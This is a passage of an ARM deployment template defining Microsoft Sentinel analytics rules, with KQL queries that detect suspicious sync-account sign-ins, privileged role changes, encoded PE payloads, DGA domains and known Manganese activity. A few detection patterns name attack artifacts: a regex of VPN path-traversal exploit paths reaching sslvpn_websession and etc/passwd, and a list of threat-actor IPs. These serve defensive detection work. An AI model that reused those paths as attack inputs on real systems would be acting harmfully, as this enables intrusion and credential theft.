                  "identifier": "Name",
                  "columnName": "TargetResourceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/be1e7bdc-dbcd-4ac6-a9fe-581528447861')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/be1e7bdc-dbcd-4ac6-a9fe-581528447861')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious Sign In by Entra ID Connect Sync Account",
          "description": "This query looks for sign ins by the Microsoft Entra ID Connect Sync account to Azure where properties about the logon are anomalous.\nThis query uses Microsoft Sentinel's UEBA features to detect these suspicious properties.\nA threat actor may attempt to steal the Sync account credentials and use them to access Azure resources. This alert should be \nreviewed to ensure that the log in came was from a legitimate source.",
          "severity": "High",
          "enabled": true,
          "query": "BehaviorAnalytics\n// User modification is expected from this account so focus on logons\n| where ActivityType =~ \"LogOn\"\n| where UserName startswith \"Sync_\" and UsersInsights.AccountDisplayName =~ \"On-Premises Directory Synchronization Service Account\"\n// Filter out this expected activity\n| where ActivityInsights.App !~ \"Microsoft Azure Active Directory Connect\"\n| where InvestigationPriority > 0\n| extend Name = split(UserPrincipalName, \"@\")[0], UPNSuffix = split(UserPrincipalName, \"@\")[1]\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "2cd8b3d5-c9e0-4be3-80f7-0469d511c3f6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Suspicious Sign In by AAD Connect Sync Account {{UserPrincipalName}} from {{SourceIPAddress}}",
            "alertDescriptionFormat": "This query looks for sign ins by the Azure AD Connect Sync account to Azure where properties about the logon are anomalous.\nThis query uses Microsoft Sentinel's UEBA features to detect these suspicious properties.\nA threat actor may attempt to steal the Sync account credentials and use them to access Azure resources. This alert should be \nreviewed to ensure that the log in came was from a legitimate source.\nIn this case {{UserPrincipalName}} logged in from {{SourceIPAddress}}.\n"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                },
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DestinationDevice"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b9515756-08e3-4089-aaa5-871dc8b3d0f5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b9515756-08e3-4089-aaa5-871dc8b3d0f5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "PIM Elevation Request Rejected",
          "description": "Identifies when a user is rejected for a privileged role elevation via PIM. Monitor rejections for indicators of attacker compromise of the requesting account.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-identity-management",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n| where ActivityDisplayName =~'Add member to role request denied (PIM activation)'\n| mv-apply ResourceItem = TargetResources on \n  (\n      where ResourceItem.type =~ \"Role\"\n      | extend Role = trim(@'\"',tostring(ResourceItem.displayName))\n  )\n| mv-apply ResourceItem = TargetResources on \n  (\n      where ResourceItem.type =~ \"User\"\n      | extend TargetUserPrincipalName = trim(@'\"',tostring(ResourceItem.userPrincipalName))\n  )\n| where isnotempty(InitiatedBy.user)\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend InitiatedByName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n| project-reorder TimeGenerated, TargetUserPrincipalName, Role, OperationName, Result, ResultDescription\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "7d7e20f8-3384-4b71-811c-f5e950e8306c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatedByName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatedByUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/29ba7764-a314-4030-b73c-af2584fd6133')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/29ba7764-a314-4030-b73c-af2584fd6133')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New User Assigned to Privileged Role",
          "description": "Identifies when a privileged role is assigned to a new user. Any account eligible for a role is now being given privileged access. If the assignment is unexpected or into a role that isn't the responsibility of the account holder, investigate.",
          "severity": "High",
          "enabled": true,
          "query": "// Define the start and end times based on input values\nlet starttime = now()-1h;\nlet endtime = now();\n// Set a lookback period of 14 days\nlet lookback = starttime - 14d;\n// Define a reusable function to query audit logs\nlet awsFunc = (start:datetime, end:datetime) {\n  AuditLogs\n  | where TimeGenerated between (start..end)\n  | where Category =~ \"RoleManagement\"\n  | where AADOperationType in (\"Assign\", \"AssignEligibleRole\")\n  | where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n  | mv-apply TargetResource = TargetResources on\n    (\n      where TargetResource.type in~ (\"User\", \"ServicePrincipal\")\n      | extend Target = iff(TargetResource.type =~ \"ServicePrincipal\", tostring(TargetResource.displayName), tostring(TargetResource.userPrincipalName)),\n      props = TargetResource.modifiedProperties\n    )\n  | mv-apply Property = props on\n    (\n      where Property.displayName =~ \"Role.DisplayName\"\n      | extend RoleName = trim('\"', tostring(Property.newValue))\n    )\n  | where RoleName contains \"Admin\" and Result == \"success\"\n};\n// Query for audit events in the current day\nlet EventInfo_CurrentDay = awsFunc(starttime, endtime);\n// Query for audit events in the historical period (lookback)\nlet EventInfo_historical = awsFunc(lookback, starttime);\n// Find unseen events by performing a left anti-join\nlet EventInfo_Unseen = (EventInfo_CurrentDay\n  | join kind=leftanti(EventInfo_historical) on Target, RoleName, OperationName\n);\n// Extend and clean up the results\nEventInfo_Unseen\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend Initiator = iif(isnotempty(InitiatingAppName), InitiatingAppName, InitiatingUserPrincipalName)\n// You can uncomment the lines below to filter out PIM activations\n// | where Initiator != \"MS-PIM\"\n// | summarize StartTime=min(TimeGenerated), EndTime=min(TimeGenerated) by OperationName, RoleName, Target, Initiator, Result\n// Project specific columns and split them for further analysis\n| project TimeGenerated, OperationName, RoleName, Target, Initiator, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, Result\n| extend TargetName = tostring(split(Target,'@',0)[0]), TargetUPNSuffix = tostring(split(Target,'@',1)[0]), InitiatorName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatorUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "050b9b3d-53d0-4364-a3da-1b678b8211ec",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Target"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatorName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatorUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0b9c229c-3997-46e7-a410-f80af7ecb016')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0b9c229c-3997-46e7-a410-f80af7ecb016')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Base64 encoded Windows process command-lines",
          "description": "Identifies instances of a base64-encoded PE file header seen in the process command line parameter.",
          "severity": "Medium",
          "enabled": true,
          "query": "let ProcessCreationEvents=(union isfuzzy=true\n(SecurityEvent\n| where EventID==4688\n| where isnotempty(CommandLine)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), count() by Computer, Account = SubjectUserName, AccountDomain = SubjectDomainName,\nFileName = Process, CommandLine, ParentProcessName\n),\n(WindowsEvent\n| where EventID==4688\n| where EventData has \"TVqQAAMAAAAEAAA\"\n| extend CommandLine = tostring(EventData.CommandLine)\n| where isnotempty(CommandLine)\n| extend ParentProcessName = tostring(EventData.ParentProcessName)\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend Process=tostring(split(NewProcessName, '\\\\')[-1])\n| extend SubjectUserName = tostring(EventData.SubjectUserName)\n| extend SubjectDomainName = tostring(EventData.SubjectDomainName)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), count() by Computer, Account = SubjectUserName, AccountDomain = SubjectDomainName,\nFileName = Process, CommandLine, ParentProcessName));\nProcessCreationEvents\n| where CommandLine contains \"TVqQAAMAAAAEAAA\"\n| extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1059",
            "T1027",
            "T1140"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "ca67c83e-7fff-4127-a3e3-1af66d6d4cad",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/48153199-f06c-434a-9bcd-8497daf6b58f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/48153199-f06c-434a-9bcd-8497daf6b58f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Possible contact with a domain generated by a DGA",
          "description": "Identifies contacts with domains names in CommonSecurityLog that might have been generated by a Domain Generation Algorithm (DGA). DGAs can be used\nby malware to generate rendezvous points that are difficult to predict in advance. This detection uses the Alexa Top 1 million domain names to build a model\nof what normal domains look like. It uses this to identify domains that may have been randomly generated by an algorithm.\nThe triThreshold is set to 500 - increase this to report on domains that are less likely to have been randomly generated, decrease it for more likely.\nThe start time and end time look back over 6 hours of data and the dgaLengthThreshold is set to 8 - meaning domains whose length is 8 or more are reported.",
          "severity": "Medium",
          "enabled": true,
          "query": "let triThreshold = 500;\nlet startTime = 6h;\nlet dgaLengthThreshold = 8;\n// fetch the alexa top 1M domains\nlet top1M =  (externaldata (Position:int, Domain:string)   [@\"http://s3-us-west-1.amazonaws.com/umbrella-static/top-1m.csv.zip\"]  with (format=\"csv\", zipPattern=\"*.csv\"));\n// extract tri grams that are above our threshold - i.e. are common\nlet triBaseline =   top1M\n| extend Domain = tolower(extract(\"([^.]*).{0,7}$\", 1, Domain))\n| extend AllTriGrams = array_concat(extract_all(\"(...)\", Domain), extract_all(\"(...)\", substring(Domain, 1)), extract_all(\"(...)\", substring(Domain, 2)))\n| mvexpand Trigram=AllTriGrams\n| summarize triCount=count() by tostring(Trigram)\n| sort by triCount desc\n| where triCount > triThreshold\n| distinct Trigram;\n// collect domain information from common security log, filter and extract the DGA candidate and its trigrams\nlet allDataSummarized =   CommonSecurityLog\n| where TimeGenerated > ago(startTime)\n| where isnotempty(DestinationHostName)\n| extend Name = tolower(DestinationHostName)\n| distinct Name\n| where Name has \".\"\n| where Name !endswith \".home\" and Name !endswith \".lan\"\n// extract DGA candidate\n| extend DGADomain = extract(\"([^.]*).{0,7}$\", 1, Name)\n| where strlen(DGADomain) > dgaLengthThreshold\n// throw out domains with number in them\n| where DGADomain matches regex \"^[A-Za-z]{0,}$\"\n// extract the tri grams from summarized data\n| extend AllTriGrams = array_concat(extract_all(\"(...)\", DGADomain), extract_all(\"(...)\", substring(DGADomain, 1)), extract_all(\"(...)\", substring(DGADomain, 2)));\n// throw out domains that have repeating tri's and/or >=3 repeating letters\nlet nonRepeatingTris =  allDataSummarized\n| join kind=leftanti\n(\n    allDataSummarized\n    | mvexpand AllTriGrams\n    | summarize count() by tostring(AllTriGrams), DGADomain\n    | where count_ > 1\n    | distinct DGADomain\n)\non DGADomain;\n// find domains that do not have a common tri in the baseline\nlet dataWithRareTris =  nonRepeatingTris\n| join kind=leftanti\n(\n    nonRepeatingTris\n    | mvexpand AllTriGrams\n    | extend Trigram = tostring(AllTriGrams)\n    | distinct Trigram, DGADomain\n    | join kind=inner\n    (\n        triBaseline\n    )\n    on Trigram\n    | distinct DGADomain\n)\non DGADomain;\ndataWithRareTris\n// join DGAs back on connection data\n| join kind=inner\n(\n    CommonSecurityLog\n    | where TimeGenerated > ago(startTime)\n    | where isnotempty(DestinationHostName)\n    | extend DestinationHostName = tolower(DestinationHostName)\n    | project-rename Name=DestinationHostName, DataSource=DeviceVendor\n    | summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated) by Name, SourceIP, DestinationIP, DataSource\n)\non Name\n| project StartTime, EndTime, Name, DGADomain, SourceIP, DestinationIP, DataSource\n| extend timestamp=StartTime, IPCustomEntity=SourceIP",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "4acd3a04-2fad-4efc-8a4b-51476594cec4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT6H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "DNS",
              "fieldMappings": [
                {
                  "identifier": "DomainName",
                  "columnName": "Name"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3f0c8577-1180-4591-a5d5-4df23146d30f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3f0c8577-1180-4591-a5d5-4df23146d30f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Abnormal- Threat Detected",
          "description": "",
          "severity": "Medium",
          "enabled": true,
          "query": "ABNORMAL_THREAT_MESSAGES_CL\r\n",
          "queryFrequency": "PT8H",
          "queryPeriod": "PT8H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Mailbox",
              "fieldMappings": [
                {
                  "identifier": "MailboxPrimaryAddress",
                  "columnName": "recipientAddress_s"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "urls_s"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f4924d5c-e288-4b31-aef6-b32d75a40602')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f4924d5c-e288-4b31-aef6-b32d75a40602')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[Deprecated] - Known Manganese IP and UserAgent activity",
          "description": "This query has been deprecated as the associated IoCs (Indicators of Compromise) are outdated and no longer relevant. To ensure effective threat detection, it is recommended to implement Microsoft's Threat Intelligence solution, which enables matching your log data with the most up-to-date IoCs generated by Microsoft. This solution can be installed from the Microsoft Sentinel Content Hub if not currently deployed. More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy",
          "severity": "High",
          "enabled": true,
          "query": "let IPList = dynamic([\"45.63.52.41\",\"140.82.17.161\",\"207.148.101.95\",\"45.32.87.51\",\"66.42.98.156\",\"45.76.144.105\",\"217.163.28.35\",\"45.32.141.174\",\"149.28.165.249\",\"209.250.225.247\",\"45.63.100.115\",\"95.179.229.230\",\"209.250.233.247\",\"45.77.121.232\",\"45.76.175.65\",\"104.238.160.237\",\"45.77.181.97\",\"95.179.192.125\",\"149.28.93.184\",\"140.82.16.81\",\"45.76.173.103\",\"45.77.255.22\",\"45.32.11.71\",\"149.28.77.26\",\"45.32.54.50\",\"104.156.233.156\",\"45.32.21.118\",\"45.63.62.109\",\"45.77.244.202\",\"149.248.11.205\",\"104.238.190.244\"]);\nlet IOCTerms = \"\\\\?lang=[/..]*/dev/cmdb/sslvpn_websession|/dana-na/jam/[/..]*home/webserver/htdocs/dana/html5acc/guacamole[/..]*etc/passwd\\\\?\";\n(union isfuzzy=true\n(CommonSecurityLog\n| where isnotempty(SourceIP) or isnotempty(DestinationIP)\n| where SourceIP in (IPList) or DestinationIP in (IPList) or has_any_ipv4 (Message, IPList)\n| extend IPMatch = case(\nSourceIP in (IPList), \"SourceIP\", \nDestinationIP in (IPList), \"DestinationIP\",\n\"Message\") \n| where Message matches regex IOCTerms\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP, DestinationIP, DeviceProduct, DeviceAction, Message, Protocol, SourcePort, DestinationPort, DeviceAddress, DeviceName, IPMatch\n| extend timestamp = StartTimeUtc, IPCustomEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"IP in Message Field\") \n),\n(OfficeActivity\n| where isnotempty(UserAgent) and ClientIP in (IPList)\n| where UserAgent contains \"ExchangeServicesClient/0.0.0.0\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated) by SourceIP = ClientIP, Account = UserId, Type, RecordType, OfficeWorkload, UserAgent, OfficeObjectId, IPMatch = \"ClientIP\"\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n)\n)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1133",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a04cf847-a832-4c60-b687-b0b6147da219",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7ac86023-2ddd-41e4-b38b-32751743464a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7ac86023-2ddd-41e4-b38b-32751743464a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Defender for Endpoint (MDE) signatures for Azure Synapse pipelines and Azure Data Factory",
          "description": "This query looks for Microsoft Defender for Endpoint detections related to the remote command execution attempts on Azure IR with Managed VNet or SHIR. \nIn Microsoft Sentinel, the SecurityAlerts table includes the name of the impacted device. Additionally, this query joins the DeviceInfo table to connect other information such as device group, \nIP address, signed in users, and others allowing analysts using Microsoft Sentinel to have more context related to the alert. \nReference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-29972 , \nhttps://msrc-blog.microsoft.com/2022/05/09/vulnerability-mitigated-in-the-third-party-data-connector-used-in-azure-synapse-pipelines-and-azure-data-factory-cve-2022-29972",
          "severity": "High",
          "enabled": true,
          "query": "let mde_threats = dynamic([\"Behavior:Win32/SuspAzureRequest.A\", \"Behavior:Win32/SuspAzureRequest.B\", \"Behavior:Win32/SuspAzureRequest.C\", \"Behavior:Win32/LaunchingSuspCMD.B\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName == \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (mde_threats) or ThreatFamilyName in~ (mde_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a333d8bf-22a3-4c55-a1e9-5f0a135c0253",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
